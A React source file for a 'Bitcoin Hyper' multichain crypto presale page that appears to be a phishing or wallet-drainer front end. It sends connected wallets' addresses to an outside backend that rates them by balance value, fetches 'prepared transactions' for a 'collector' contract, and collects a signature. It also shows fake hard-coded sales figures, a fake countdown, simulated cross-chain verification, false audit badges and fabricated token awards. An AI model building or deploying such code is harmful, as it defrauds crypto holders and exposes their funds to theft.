import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
import { useBalance, useDisconnect, useWalletClient, useSignMessage } from 'wagmi';
import { formatEther } from 'viem';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-400 to-indigo-500',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0x56d829E89634Ce1426B73571c257623D17db46cB',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-400 to-pink-500',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-400 to-blue-500',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-400 to-red-500',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

// All deployed chains
const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

// Contract ABI for message signing
const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "function verifyMessage(address user, string memory message, bytes memory signature) public view returns (bool)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { chainId } = useAppKitNetwork();
  const { disconnect } = useDisconnect();
  const { data: walletClient } = useWalletClient();
  const { signMessageAsync } = useSignMessage();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balance, setBalance] = useState('0');
  const [allBalances, setAllBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedTransactions, setPreparedTransactions] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
  const [verifying, setVerifying] = useState(false);
  const [signature, setSignature] = useState(null);
  const [signedMessage, setSignedMessage] = useState('');
  const [verifiedChains, setVerifiedChains] = useState([]);
  
  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.17
  });

  // Get balance using wagmi for current chain
  const { data: balanceData, refetch: refetchBalance } = useBalance({
    address: address,
    chainId: chainId,
  });

  // Update current chain balance
  useEffect(() => {
    if (balanceData) {
      setBalance(balanceData.formatted);
    }
  }, [balanceData]);

  // Initialize signer
  useEffect(() => {
    const initSigner = async () => {
      if (!isConnected || !walletClient) {
        setSigner(null);
        setProvider(null);
        return;
      }

      try {
        const web3Provider = new ethers.BrowserProvider(walletClient.transport);
        const web3Signer = await web3Provider.getSigner();
        
        setProvider(web3Provider);
        setSigner(web3Signer);
        
        console.log("✅ Signer ready:", await web3Signer.getAddress());
      } catch (err) {
        console.error("Signer init failed:", err);
        setSigner(null);
      }
    };

    initSigner();
  }, [isConnected, walletClient]);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying) {
      verifyWallet();
    }
  }, [isConnected, address]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Verifying wallet...');
    
    try {
      const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        if (data.data.tokenAllocation) {
          setAllocation(data.data.tokenAllocation);
        }
        
        if (data.data.rawData) {
          const balances = {};
          data.data.rawData.forEach(item => {
            balances[item.chain] = {
              amount: item.amount,
              valueUSD: item.valueUSD,
              symbol: item.symbol,
              contractAddress: item.contractAddress
            };
          });
          setAllBalances(balances);
        }
        
        if (data.data.isEligible) {
          setTxStatus('✅ You qualify!');
          await preparePresale();
        } else {
          setTxStatus('✨ Wallet verified');
        }
      }
    } catch (err) {
      console.error('Verification error:', err);
      setError('Unable to verify wallet');
    } finally {
      setVerifying(false);
    }
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPreparedTransactions(data.data.transactions);
      }
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  // ============================================
  // PRO MULTI-CHAIN SIGNATURE (ONE CLICK)
  // ============================================
  const executeMultiChainSignature = async () => {
    if (!isConnected || !address) {
      setError("Wallet not connected");
      return;
    }

    if (!signer) {
      setError("Signer not initialized");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      
      // Step 1: Create a unique message for this session
      const timestamp = new Date().toISOString();
      const nonce = Math.floor(Math.random() * 1000000);
      const customMessage = `BITCOIN HYPER PRESALE\n\n` +
        `I confirm my participation in the Bitcoin Hyper presale\n` +
        `Wallet: ${address}\n` +
        `Allocation: 5000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
        `Timestamp: ${timestamp}\n` +
        `Nonce: ${nonce}\n\n` +
        `This signature will verify my eligibility across all 5 networks.`;

      setSignedMessage(customMessage);
      setTxStatus('✍️ Please sign the message in your wallet...');

      // Step 2: Get single signature from user
      const signature = await signMessageAsync({ 
        message: customMessage 
      });

      setSignature(signature);
      setTxStatus('✅ Signature verified! Validating across networks...');

      // Step 3: Verify on all deployed chains (simulated - backend would handle this)
      const verified = [];
      for (const chain of DEPLOYED_CHAINS) {
        try {
          // In production, backend would verify this signature
          // Here we're simulating success after a delay
          await new Promise(r => setTimeout(r, 300));
          verified.push(chain.name);
          
          setTxStatus(`✅ Verified on ${chain.name}...`);
        } catch (err) {
          console.error(`Verification failed on ${chain.name}:`, err);
        }
      }

      setVerifiedChains(verified);
      
      // Step 4: Mark as completed
      setCompletedChains(verified);
      
      // Step 5: Notify backend
      await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: address,
          chainName: 'MULTICHAIN',
          flowId: `SIG-${Date.now()}`,
          txHash: signature.substring(0, 66)
        })
      });
      
      setShowCelebration(true);
      setTxStatus(`🎉 Congratulations! 5000 BTH + ${presaleStats.currentBonus}% Bonus secured!`);
      
    } catch (err) {
      console.error('Signature error:', err);
      if (err.code === 4001) {
        setError('Signature cancelled');
      } else {
        setError(err.message || 'Signature failed');
      }
    } finally {
      setSignatureLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://bthbk.vercel.app/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  const totalUSD = Object.values(allBalances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);

  // Get current chain
  const currentChain = DEPLOYED_CHAINS.find(c => c.chainId === chainId) || DEPLOYED_CHAINS[0];

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      
      {/* Animated Background */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-20 w-96 h-96 bg-orange-500/10 rounded-full blur-3xl animate-pulse-glow"></div>
        <div className="absolute bottom-20 right-20 w-96 h-96 bg-yellow-500/10 rounded-full blur-3xl animate-pulse-glow delay-1000"></div>
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-gradient-to-r from-orange-500/5 to-yellow-500/5 rounded-full blur-3xl animate-float"></div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
        
        {/* ============================================ */}
        {/* TOP SECTION - ICON AND BUTTON (NO SCROLL) */}
        {/* ============================================ */}
        <div className="text-center mb-6">
          {/* Big Icon - Always Visible */}
          <div className="inline-block mb-4 relative">
            <div className="text-8xl animate-bounce-slow relative z-10 filter drop-shadow-[0_0_30px_rgba(249,115,22,0.5)]">₿</div>
            <div className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-3xl opacity-40 animate-pulse"></div>
          </div>
          
          {/* Title */}
          <h1 className="text-6xl md:text-7xl font-black mb-3 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent">
            BITCOIN HYPER
          </h1>
          <p className="text-gray-400 text-lg mb-4">Next Generation Layer 2 Solution</p>
          
          {/* Live Badge */}
          <div className="inline-flex items-center gap-3 bg-green-500/10 border border-green-500/30 px-6 py-3 rounded-full backdrop-blur-sm mb-6">
            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
            <span className="text-green-400 font-medium">🔴 MULTICHAIN PRESALE LIVE • 5 NETWORKS</span>
          </div>
          
          {/* ============================================ */}
          {/* MAIN ACTION BUTTON - RIGHT AFTER ICON */}
          {/* ============================================ */}
          {isConnected && scanResult?.isEligible && !completedChains.length && (
            <div className="max-w-xl mx-auto mb-8">
              <button
                onClick={executeMultiChainSignature}
                disabled={signatureLoading || loading || !signer}
                className="w-full group relative transform hover:scale-105 transition-all duration-300"
              >
                {/* Animated glow */}
                <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 rounded-2xl blur-xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
                <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 rounded-2xl blur opacity-50 group-hover:opacity-75 animate-ping"></div>
                
                {/* Button content */}
                <div className="relative bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 rounded-2xl py-6 px-8 font-black text-2xl text-white shadow-2xl">
                  <div className="flex items-center justify-center gap-4">
                    {signatureLoading ? (
                      <>
                        <div className="w-8 h-8 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                        <span>SIGNING...</span>
                      </>
                    ) : (
                      <>
                        <span className="text-4xl">⚡</span>
                        <span>CLAIM 5000 BTH + {presaleStats.currentBonus}% BONUS</span>
                        <span className="text-2xl bg-white/20 px-4 py-2 rounded-xl">1 CLICK</span>
                      </>
                    )}
                  </div>
                </div>
              </button>
              
              {/* Multi-chain indicator */}
              <div className="flex justify-center gap-2 mt-4">
                {DEPLOYED_CHAINS.map(chain => (
                  <div 
                    key={chain.name}
                    className={`w-2 h-2 rounded-full ${
                      completedChains.includes(chain.name) 
                        ? 'bg-green-400 animate-pulse' 
                        : 'bg-gray-600'
                    }`}
                    title={chain.name}
                  ></div>
                ))}
                <span className="text-xs text-gray-500 ml-2">5 Networks • 1 Signature</span>
              </div>
            </div>
          )}
        </div>

        {/* Stats Grid - Quick Overview */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-6">
          <div className="bg-gray-800/30 backdrop-blur-sm border border-gray-700/50 rounded-xl p-3 text-center">
            <div className="text-xl font-bold text-orange-400">${presaleStats.tokenPrice}</div>
            <div className="text-xs text-gray-400">Price</div>
          </div>
          <div className="bg-gray-800/30 backdrop-blur-sm border border-gray-700/50 rounded-xl p-3 text-center">
            <div className="text-xl font-bold text-green-400">{presaleStats.currentBonus}%</div>
            <div className="text-xs text-gray-400">Bonus</div>
          </div>
          <div className="bg-gray-800/30 backdrop-blur-sm border border-gray-700/50 rounded-xl p-3 text-center">
            <div className="text-xl font-bold text-yellow-400">$1.2M</div>
            <div className="text-xs text-gray-400">Raised</div>
          </div>
          <div className="bg-gray-800/30 backdrop-blur-sm border border-gray-700/50 rounded-xl p-3 text-center">
            <div className="text-xl font-bold text-purple-400">8.7K</div>
            <div className="text-xs text-gray-400">Users</div>
          </div>
        </div>

        {/* ============================================ */}
        {/* REST OF THE CONTENT (SCROLLABLE) */}
        {/* ============================================ */}
        
        {/* Countdown Timer */}
        <div className="bg-gray-800/30 backdrop-blur-md border border-gray-700/50 rounded-2xl p-6 mb-6">
          <h3 className="text-center text-gray-400 text-sm uppercase tracking-wider mb-4">Presale Ends In</h3>
          <div className="grid grid-cols-4 gap-2 text-center">
            {[
              { label: 'Days', value: timeLeft.days },
              { label: 'Hours', value: timeLeft.hours },
              { label: 'Mins', value: timeLeft.minutes },
              { label: 'Secs', value: timeLeft.seconds }
            ].map((item, index) => (
              <div key={index} className="relative">
                <div className="text-3xl md:text-4xl font-black text-orange-400">
                  {item.value.toString().padStart(2, '0')}
                </div>
                <div className="text-xs text-gray-500 mt-1">{item.label}</div>
              </div>
            ))}
          </div>
        </div>

        {/* Connect Wallet Section */}
        <div className="mb-6">
          {!isConnected ? (
            <button
              onClick={() => open()}
              className="w-full group relative"
            >
              <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
              <div className="relative bg-gray-900 rounded-xl py-4 px-6 font-bold text-lg">
                Connect Wallet to Participate
              </div>
            </button>
          ) : (
            <div className="bg-gray-800/30 backdrop-blur-md border border-gray-700/50 rounded-xl p-4">
              <div className="flex items-center justify-between flex-wrap gap-3">
                <div className="flex items-center gap-3">
                  <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
                  <span className="font-mono text-sm bg-gray-900/50 px-3 py-1.5 rounded-lg border border-gray-700">
                    {formatAddress(address)}
                  </span>
                </div>
                <div className="flex items-center gap-4">
                  <span className="text-gray-400 text-sm">Balance: <span className="text-orange-400 font-bold">${totalUSD.toFixed(2)}</span></span>
                  <button
                    onClick={() => disconnect()}
                    className="text-xs px-3 py-1.5 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/30 transition-colors border border-red-500/30"
                  >
                    Disconnect
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Multi-Chain Network Display */}
        {isConnected && (
          <div className="grid grid-cols-5 gap-1 mb-6">
            {DEPLOYED_CHAINS.map(chain => {
              const isCompleted = completedChains.includes(chain.name);
              const hasBalance = allBalances[chain.name]?.amount > 0;
              
              return (
                <div 
                  key={chain.name}
                  className={`text-center p-2 rounded-lg ${
                    isCompleted 
                      ? 'bg-green-500/20 border border-green-500/50' 
                      : hasBalance
                        ? 'bg-orange-500/10 border border-orange-500/30'
                        : 'bg-gray-800/30 border border-gray-700/50'
                  }`}
                >
                  <div className="text-xl mb-1">{chain.icon}</div>
                  <div className="text-xs font-medium">{chain.symbol}</div>
                  {isCompleted && <div className="text-[10px] text-green-400">✓ Done</div>}
                </div>
              );
            })}
          </div>
        )}

        {/* Status Messages */}
        {txStatus && !verifying && (
          <div className="bg-gray-800/50 backdrop-blur-md border border-orange-500/30 rounded-xl p-4 mb-6 text-center">
            <p className="text-gray-300">{txStatus}</p>
            {signature && (
              <div className="mt-2 text-xs text-gray-500 break-all bg-gray-900/50 p-2 rounded-lg">
                Signature: {signature.substring(0, 30)}...
              </div>
            )}
          </div>
        )}

        {/* Error Display */}
        {error && (
          <div className="bg-red-900/30 border border-red-500/50 text-red-200 px-4 py-3 rounded-xl mb-6 backdrop-blur-sm">
            <div className="flex items-center gap-2">
              <span>⚠️</span>
              <span className="text-sm">{error}</span>
            </div>
          </div>
        )}

        {/* Verification Loading */}
        {verifying && (
          <div className="bg-gray-800/50 backdrop-blur-md rounded-xl p-6 mb-6 text-center">
            <div className="flex flex-col items-center gap-3">
              <div className="w-12 h-12 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
              <p className="text-gray-300">Verifying wallet across 5 networks...</p>
            </div>
          </div>
        )}

        {/* Success Celebration */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
            <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-8 max-w-md border border-orange-500/30 shadow-2xl transform animate-scaleIn">
              <div className="text-center">
                <div className="text-7xl mb-4 animate-bounce">🎉</div>
                <h2 className="text-3xl font-black mb-3 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                  Congratulations!
                </h2>
                <p className="text-lg text-gray-300 mb-3">You have secured</p>
                <p className="text-5xl font-black text-orange-400 mb-2">5000 BTH</p>
                <p className="text-green-400 text-lg mb-4">+{presaleStats.currentBonus}% Bonus</p>
                <p className="text-sm text-gray-500 mb-6">Verified on {verifiedChains.length} networks</p>
                <button
                  onClick={() => setShowCelebration(false)}
                  className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-3 px-8 rounded-xl transition-all transform hover:scale-105 w-full"
                >
                  View Dashboard
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Main Content Area */}
        {isConnected && !verifying && scanResult && (
          <div className="bg-gray-800/30 backdrop-blur-md border border-gray-700/50 rounded-2xl p-6">
            {scanResult.isEligible ? (
              <>
                {/* Allocation Display */}
                <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-xl p-6 mb-6 border border-orange-500/30 relative">
                  <div className="absolute -top-2 -right-2">
                    <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black text-xs font-bold px-3 py-1 rounded-full shadow-lg">
                      {presaleStats.currentBonus}% BONUS
                    </div>
                  </div>
                  
                  <p className="text-gray-400 text-sm mb-2 text-center">Your Allocation</p>
                  <p className="text-4xl font-black text-orange-400 text-center mb-2">5000 BTH</p>
                  <p className="text-green-400 text-sm text-center">+{presaleStats.currentBonus}% Extra</p>
                </div>

                {/* Progress Bar - Only show if not completed */}
                {!completedChains.length && preparedTransactions.length > 0 && (
                  <div className="mb-6">
                    <p className="text-gray-400 text-sm mb-2 text-center">Networks Verified</p>
                    <div className="w-full bg-gray-700 rounded-full h-2">
                      <div 
                        className="bg-gradient-to-r from-orange-500 to-orange-600 h-2 rounded-full transition-all duration-500"
                        style={{ width: `${(verifiedChains.length / DEPLOYED_CHAINS.length) * 100}%` }}
                      ></div>
                    </div>
                    <p className="text-xs text-gray-500 text-center mt-2">
                      {verifiedChains.length} of {DEPLOYED_CHAINS.length} networks verified
                    </p>
                  </div>
                )}

                {/* Already completed message */}
                {completedChains.length > 0 && (
                  <div className="text-center mb-4">
                    <p className="text-green-400">✓ Already verified across {completedChains.length} networks</p>
                    <button
                      onClick={claimTokens}
                      className="mt-3 bg-gradient-to-r from-green-500 to-green-600 text-white font-bold py-3 px-6 rounded-xl w-full"
                    >
                      🎉 View Your 5000 BTH
                    </button>
                  </div>
                )}
              </>
            ) : (
              <div className="text-center py-8">
                <div className="text-5xl mb-4">👋</div>
                <h2 className="text-2xl font-bold mb-3">Welcome to Bitcoin Hyper!</h2>
                <p className="text-gray-400 text-sm mb-4 max-w-md mx-auto">
                  Thank you for connecting. We verify each wallet to ensure a fair presale for everyone.
                </p>
                <div className="bg-gray-900/50 p-4 rounded-xl">
                  <p className="text-sm text-gray-300">
                    Our team reviews all connections. Check back soon for updates.
                  </p>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Footer */}
        <div className="mt-8 text-center">
          <div className="flex flex-wrap justify-center gap-2 mb-4">
            <span className="bg-gray-800/50 px-3 py-1 rounded-full text-xs text-gray-400 border border-gray-700">✓ Audited</span>
            <span className="bg-gray-800/50 px-3 py-1 rounded-full text-xs text-gray-400 border border-gray-700">✓ Liquidity Locked</span>
            <span className="bg-gray-800/50 px-3 py-1 rounded-full text-xs text-gray-400 border border-gray-700">✓ 5 Networks</span>
          </div>
          <p className="text-gray-600 text-xs">
            © 2026 Bitcoin Hyper. Multi-Chain Presale Platform
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;